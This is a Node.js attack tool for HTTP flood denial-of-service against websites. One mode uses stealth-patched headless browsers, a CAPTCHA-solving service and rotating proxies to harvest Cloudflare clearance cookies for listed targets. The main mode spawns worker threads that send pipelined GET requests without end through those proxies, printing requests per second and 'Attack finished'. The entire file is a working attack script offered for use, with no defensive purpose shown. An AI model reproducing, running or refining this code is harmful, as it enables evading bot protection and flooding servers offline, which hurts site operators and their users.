const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const undici = require('undici');
const os = require('os');
const path = require('path');

puppeteer.use(StealthPlugin());
puppeteer.use(RecaptchaPlugin({
  provider: { id: '2captcha', token: 'YOUR_2CAPTCHA_API_KEY' },
  visualFeedback: true
}));

if (process.argv.includes('--keymaster')) {
  (async () => {
    const targetsFile = process.argv[3] || 'targets.txt';
    const proxiesFile = process.argv[4] || 'proxies.txt';
    const outputFile = process.argv[5] || 'cookies.json';
    
    const targets = fs.readFileSync(targetsFile, 'utf-8').split('\n').filter(Boolean);
    const proxies = fs.readFileSync(proxiesFile, 'utf-8').split('\n').filter(Boolean);
    
    const results = [];
    
    for (const target of targets) {
      for (const proxy of proxies) {
        try {
          const proxyParts = proxy.split(':');
          const proxyConfig = {
            host: proxyParts[0],
            port: parseInt(proxyParts[1]),
          };
          
          if (proxyParts.length === 4) {
            proxyConfig.auth = {
              username: proxyParts[2],
              password: proxyParts[3]
            };
          }
          
          const browser = await puppeteer.launch({
            headless: true,
            args: [
              '--no-sandbox',
              '--disable-setuid-sandbox',
              '--disable-dev-shm-usage',
              '--disable-accelerated-2d-canvas',
              '--no-first-run',
              '--no-zygote',
              '--disable-gpu',
              '--single-process',
              '--window-size=1024,768',
              '--disable-blink-features=AutomationControlled',
              `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
            ]
          });
          
          const page = await browser.newPage();
          
          if (proxyConfig.auth) {
            await page.authenticate(proxyConfig.auth);
          }
          
          await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
          await page.setViewport({ width: 1024, height: 768 });
          
          await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
              get: () => undefined,
            });
            
            Object.defineProperty(navigator, 'plugins', {
              get: () => [
                {
                  0: {type: "application/x-google-chrome-pdf"},
                  description: "Portable Document Format",
                  filename: "internal-pdf-viewer",
                  length: 1,
                  name: "Chrome PDF Plugin"
                }
              ],
            });
            
            Object.defineProperty(navigator, 'languages', {
              get: () => ['en-US', 'en'],
            });
            
            window.chrome = {
              app: {
                isInstalled: false,
              },
              webstore: {
                onInstallStageChanged: {},
                onDownloadProgress: {},
              },
              runtime: {
                PlatformOs: {
                  MAC: 'mac',
                  WIN: 'win',
                  ANDROID: 'android',
                  CROS: 'cros',
                  LINUX: 'linux',
                  OPENBSD: 'openbsd',
                },
                PlatformArch: {
                  ARM: 'arm',
                  X86_32: 'x86-32',
                  X86_64: 'x86-64',
                },
                PlatformNaclArch: {
                  ARM: 'arm',
                  X86_32: 'x86-32',
                  X86_64: 'x86-64',
                },
                RequestUpdateCheckStatus: {
                  THROTTLED: 'throttled',
                  NO_UPDATE: 'no_update',
                  UPDATE_AVAILABLE: 'update_available',
                }
              }
            };
          });
          
          await page.goto(target, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
          });
          
          const cookies = await page.cookies();
          const cfClearance = cookies.find(cookie => cookie.name === 'cf_clearance');
          const cfChlRc = cookies.find(cookie => cookie.name === 'cf_chl_rc');
          const cfChlRcNi = cookies.find(cookie => cookie.name === 'cf_chl_rc_ni');
          
          if (cfClearance || cfChlRc || cfChlRcNi) {
            const userAgent = await page.evaluate(() => navigator.userAgent);
            results.push({
              target,
              proxy,
              cookies,
              userAgent,
              timestamp: Date.now()
            });
            console.log(`[+] Got cookies for ${target} with proxy ${proxy}`);
          }
          
          await browser.close();
        } catch (error) {
          console.log(`[-] Failed for ${target} with proxy ${proxy}: ${error.message}`);
        }
      }
    }
    
    fs.writeFileSync(outputFile, JSON.stringify(results, null, 2));
    console.log(`[+] Saved ${results.length} entries to ${outputFile}`);
    process.exit(0);
  })();
} else if (isMainThread) {
  const cookiesFile = process.argv[2] || 'cookies.json';
  const duration = parseInt(process.argv[3]) || 300;
  const numWorkers = parseInt(process.argv[4]) || os.cpus().length;
  
  const cookies = JSON.parse(fs.readFileSync(cookiesFile, 'utf-8'));
  
  let totalRequests = 0;
  let startTime = Date.now();
  let statsInterval;
  
  const workers = [];
  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker(__filename, {
      workerData: {
        cookies: cookies.filter((_, index) => index % numWorkers === i),
        workerId: i
      }
    });
    
    worker.on('message', (data) => {
      if (data.type === 'stats') {
        totalRequests += data.count;
      }
    });
    
    workers.push(worker);
  }
  
  statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = Math.round(totalRequests / elapsed);
    console.log(`[+] RPS: ${rps.toLocaleString()} | Total: ${totalRequests.toLocaleString()} | Elapsed: ${elapsed.toFixed(1)}s`);
  }, 1000);
  
  setTimeout(() => {
    clearInterval(statsInterval);
    console.log(`[+] Attack finished. Total requests: ${totalRequests.toLocaleString()}`);
    workers.forEach(worker => worker.terminate());
    process.exit(0);
  }, duration * 1000);
} else {
  const { cookies, workerId } = workerData;
  let requestCount = 0;
  
  const clients = new Map();
  
  const getClient = async (target, proxy, cookies) => {
    const key = `${target}:${proxy}`;
    
    if (!clients.has(key)) {
      const proxyParts = proxy.split(':');
      const dispatcher = new undici.Pool(`http://${target}`, {
        connections: 100,
        pipelining: 10,
        proxy: `http://${proxyParts[0]}:${proxyParts[1]}`
      });
      
      clients.set(key, dispatcher);
    }
    
    return clients.get(key);
  };
  
  const sendRequests = async () => {
    for (const entry of cookies) {
      try {
        const client = await getClient(
          new URL(entry.target).host,
          entry.proxy,
          entry.cookies
        );
        
        const cookieHeader = entry.cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        const options = {
          path: '/',
          method: 'GET',
          headers: {
            'User-Agent': entry.userAgent,
            'Cookie': cookieHeader,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
          }
        };
        
        const promises = [];
        for (let i = 0; i < 10; i++) {
          promises.push(
            client.request(options)
              .then(({ body }) => {
                body.drain().catch(() => {});
                requestCount++;
              })
              .catch(() => {})
          );
        }
        
        await Promise.allSettled(promises);
      } catch (error) {
        // Silently ignore errors
      }
    }
    
    setImmediate(sendRequests);
  };
  
  sendRequests();
  
  setInterval(() => {
    parentPort.postMessage({
      type: 'stats',
      count: requestCount
    });
    requestCount = 0;
  }, 1000);
}
